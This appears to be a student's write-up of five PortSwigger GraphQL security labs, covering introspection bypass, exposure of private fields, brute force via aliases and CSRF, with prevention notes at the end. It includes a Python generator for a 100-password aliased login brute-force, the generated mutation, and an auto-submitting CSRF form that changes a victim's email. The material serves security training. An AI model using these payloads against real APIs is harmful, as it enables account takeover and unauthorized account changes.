# GraphQL API Vulnerabilities

> PortSwigger Web Security Academy · **5/5** labs completed

GraphQL APIs can leak schema details through introspection, expose private fields, and allow brute force or CSRF if rate limiting and request checks are weak.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. Accessing private GraphQL posts](#1-accessing-private-graphql-posts)
- [2. Accidental exposure of private GraphQL fields](#2-accidental-exposure-of-private-graphql-fields)
- [3. Finding a hidden GraphQL endpoint](#3-finding-a-hidden-graphql-endpoint)
- [4. Bypassing GraphQL brute force protections](#4-bypassing-graphql-brute-force-protections)
- [5. Performing CSRF exploits over GraphQL](#5-performing-csrf-exploits-over-graphql)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Find the GraphQL endpoint if not given (common paths: `/graphql`, `/api/graphql`, `/v1/graphql`), including by checking JS files or trying different HTTP methods.
- Check if introspection is enabled (`__schema` query) to enumerate every type, field, query and mutation.
- If introspection is disabled, try field suggestion (typo a field name and see if the error suggests the real one) to map the schema piece by piece.
- Check each field and mutation for missing authorization — does a 'private' field return data it shouldn't, separately from the main object's own access control?
- Test rate limiting bypass via query batching or aliasing (send many login attempts as aliased operations in a single request).
- Check whether mutations only accept `application/json` POST, or whether GET/form-encoded requests also work, which would allow CSRF.
- Test query depth/complexity limits, and nested queries that could cause denial of service or walk relationships to reach unauthorized data.

## Lab write-ups

### 1. Accessing private GraphQL posts

**Lab:** [Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

- In this lab we have to find a hidden post and the password for it
- To do this first go to the webpage
- In http history we got a endpoint which is `graphql/v1` and it contains the introspection structure, when I send it, it displayed the posts of id 1 2 4 5 but not 3.
- Now send the request to the repeater and right click in blank space in repeater tab and select graphql->set introspection query and send it
- You will get a big response, now search for password and you will get a field name called postPassword
- Now view a post and see the `/graphql/v1` request, there will be a section called graphql go inside that and change the id to 3 and add the field postPassword and send it
- You will get the password and submit it

---

### 2. Accidental exposure of private GraphQL fields

**Lab:** [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

- First we need to go to the login page and send a random username and password
- Then we will inspect the login endpoint were we will get /graphql endpoint
- We will copy the url of that endpoint and post it in inQL scanner in burpsuite
- Then we will inspect every query of the graphql and we found out that there is a query function where it uses for login
- We will use that and we change the userid to 1 and now we got the administrator account
- We send the query and now we got the password.
- Login to admin account and delete carlos

---

### 3. Finding a hidden GraphQL endpoint

**Lab:** [Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

- In this lab first we have to go to login page and enter some random password.
- Send the request to the intruder and get some common graphql endpoints from the internet and start a sniper attack
- Not that for `/api` we get 405 and other than that we get 404 and now we can say that the endpoint exists
- Now send it using POST and in response we found out that there is GET method allowed
- Now remove the login data and add the query to find the root object type of graphql using this query
- `{"query":"query{__typename}}`- this query is sent to check whether there exists the graphql endpoint. `__typename` is a built-in meta field of graphql and it can be queried to any endpoint of graphql and it retrieves the object type of the query
- Now we got the response as `{ "data": { "__typename": "Query" } }` and now we confirm that this is the graphql endpoint and it returns the objecttpye's  name of the query which is Query because we requested the root directory
- Now we try to send the schema query to find the schema which is `query{__schema{queryType{name}}}`-  this query is used to retrieve all the data fetching endpoints which is query(not mutation or subscriptions) so that we can understand all the data fetching endpoints exists
- `queryType` is used to retrieve the type of the object here it is Query
- Now the response is error because introspection is disabled here
- Now we try to rewrite the query in this way

```graphql
query{__schema
{queryType{name}}}
```

- This lab only checks whether there is a `{` after `__schema` and now when we push all the values to the next line we have successfully bypassed the check
- Then we will get the introspection payload from the internet and press enter after  `__schema` and run the query
- We will get a huge response and now we will take the whole json response and save it
- Now we load the file and url in inQL scanner and we will be able to see queryopetaiona nd mutation operation
- First we will get the carlos id number using query operator and we use it to delete it through mutation operation
- The queries are

```graphql
query getUser {
    getUser(id: 3) {
        id
        username
    }
}


  mutation deleteOrganizationUser {
    deleteOrganizationUser(input: {id:3}) {
        user {
            id
            username
        }
    }
}
```

- Now we have successfully deleted the account

---

### 4. Bypassing GraphQL brute force protections

**Lab:** [Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

- This lab it has rate limiting of 3 for login and we are going to bypass it with aliases.
- We got the password list and the username is carlos and our job is to build the proper mutation query for 100 password to brute force it
- First we need to get the format correctly and this is the format
- `mutation { attempt1: login(input: { username: "carlos" password: "123456" }) { token success }`
- Now we will write the py code to achieve it for 100 password
- script.py

```python
passwords = """123456

password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow"""
# Remove leading/trailing whitespace and ignore empty lines

password_list = [

line.strip()

for line in passwords.splitlines()

if line.strip()

]

query_parts = []

for index, password in enumerate(password_list):

query_parts.append(

f''' bruteforce{index}: login(input: {{

password: "{password}"

username: "carlos"

}}) {{

token

success

}}'''

)

query = "mutation {{\n" + "\n".join(query_parts) + "\n}"

print(query)
```

- Now we got the query

```graphql
mutation {
  bruteforce0: login(input: {
    password: "123456"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce1: login(input: {
    password: "password"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce2: login(input: {
    password: "12345678"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce3: login(input: {
    password: "qwerty"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce4: login(input: {
    password: "123456789"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce5: login(input: {
    password: "12345"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce6: login(input: {
    password: "1234"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce7: login(input: {
    password: "111111"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce8: login(input: {
    password: "1234567"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce9: login(input: {
    password: "dragon"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce10: login(input: {
    password: "123123"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce11: login(input: {
    password: "baseball"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce12: login(input: {
    password: "abc123"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce13: login(input: {
    password: "football"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce14: login(input: {
    password: "monkey"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce15: login(input: {
    password: "letmein"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce16: login(input: {
    password: "shadow"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce17: login(input: {
    password: "master"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce18: login(input: {
    password: "666666"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce19: login(input: {
    password: "qwertyuiop"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce20: login(input: {
    password: "123321"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce21: login(input: {
    password: "mustang"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce22: login(input: {
    password: "1234567890"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce23: login(input: {
    password: "michael"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce24: login(input: {
    password: "654321"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce25: login(input: {
    password: "superman"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce26: login(input: {
    password: "1qaz2wsx"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce27: login(input: {
    password: "7777777"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce28: login(input: {
    password: "121212"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce29: login(input: {
    password: "000000"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce30: login(input: {
    password: "qazwsx"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce31: login(input: {
    password: "123qwe"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce32: login(input: {
    password: "killer"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce33: login(input: {
    password: "trustno1"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce34: login(input: {
    password: "jordan"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce35: login(input: {
    password: "jennifer"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce36: login(input: {
    password: "zxcvbnm"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce37: login(input: {
    password: "asdfgh"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce38: login(input: {
    password: "hunter"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce39: login(input: {
    password: "buster"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce40: login(input: {
    password: "soccer"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce41: login(input: {
    password: "harley"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce42: login(input: {
    password: "batman"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce43: login(input: {
    password: "andrew"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce44: login(input: {
    password: "tigger"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce45: login(input: {
    password: "sunshine"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce46: login(input: {
    password: "iloveyou"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce47: login(input: {
    password: "2000"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce48: login(input: {
    password: "charlie"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce49: login(input: {
    password: "robert"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce50: login(input: {
    password: "thomas"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce51: login(input: {
    password: "hockey"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce52: login(input: {
    password: "ranger"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce53: login(input: {
    password: "daniel"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce54: login(input: {
    password: "starwars"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce55: login(input: {
    password: "klaster"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce56: login(input: {
    password: "112233"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce57: login(input: {
    password: "george"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce58: login(input: {
    password: "computer"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce59: login(input: {
    password: "michelle"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce60: login(input: {
    password: "jessica"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce61: login(input: {
    password: "pepper"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce62: login(input: {
    password: "1111"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce63: login(input: {
    password: "zxcvbn"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce64: login(input: {
    password: "555555"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce65: login(input: {
    password: "11111111"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce66: login(input: {
    password: "131313"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce67: login(input: {
    password: "freedom"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce68: login(input: {
    password: "777777"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce69: login(input: {
    password: "pass"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce70: login(input: {
    password: "maggie"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce71: login(input: {
    password: "159753"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce72: login(input: {
    password: "aaaaaa"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce73: login(input: {
    password: "ginger"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce74: login(input: {
    password: "princess"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce75: login(input: {
    password: "joshua"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce76: login(input: {
    password: "cheese"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce77: login(input: {
    password: "amanda"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce78: login(input: {
    password: "summer"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce79: login(input: {
    password: "love"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce80: login(input: {
    password: "ashley"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce81: login(input: {
    password: "nicole"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce82: login(input: {
    password: "chelsea"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce83: login(input: {
    password: "biteme"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce84: login(input: {
    password: "matthew"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce85: login(input: {
    password: "access"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce86: login(input: {
    password: "yankees"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce87: login(input: {
    password: "987654321"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce88: login(input: {
    password: "dallas"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce89: login(input: {
    password: "austin"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce90: login(input: {
    password: "thunder"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce91: login(input: {
    password: "taylor"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce92: login(input: {
    password: "matrix"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce93: login(input: {
    password: "mobilemail"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce94: login(input: {
    password: "mom"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce95: login(input: {
    password: "monitor"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce96: login(input: {
    password: "monitoring"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce97: login(input: {
    password: "montana"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce98: login(input: {
    password: "moon"
    username: "carlos"
  }) {
    token
    success
  }
  bruteforce99: login(input: {
    password: "moscow"
    username: "carlos"
  }) {
    token
    success
  }
}
```

- Run this query and search for success="true" and get the corresponding password and login to carlos account

---

### 5. Performing CSRF exploits over GraphQL

**Lab:** [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

- First we need to get to login endpoint and login to our account
- The vuln is it uses `x-www-form-urlencoded` and the endpoint is change email
- So we need to craft a CSRF payload to exploit it
- csrf payload as HTML reference text

```html
<html>
  <body>
    <form
      action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1"
      method="POST"
    >
      <input
        type="hidden"
        name="query"
        value="&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x20;&#x7b;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x20;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x20;&#x7d;&#x20;&#x7d;"
      />

      <input
        type="hidden"
        name="operationName"
        value="changeEmail"
      />

      <input
        type="hidden"
        name="variables"
        value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x22;&#x67;&#x6f;&#x75;&#x74;&#x68;&#x61;&#x6d;&#x40;&#x67;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;"
      />
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- The normal value is

```html
<html>
  <body>
    <form
      action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1"
      method="POST"
    >
      <input
        type="hidden"
        name="query"
        value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }"
      />

      <input
        type="hidden"
        name="operationName"
        value="changeEmail"
      />

      <input
        type="hidden"
        name="variables"
        value='{"input":{"email":"user@example.com"}}'
      />
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Disable introspection and field suggestions in production, but do not treat that as access control.
- Enforce authorization in every resolver (object and field level).
- Limit query depth, cost and number of aliases/batched operations to stop brute force through aliasing.
- Accept only `application/json` for mutations. Reject GET and form-encoded requests, which makes CSRF much harder.
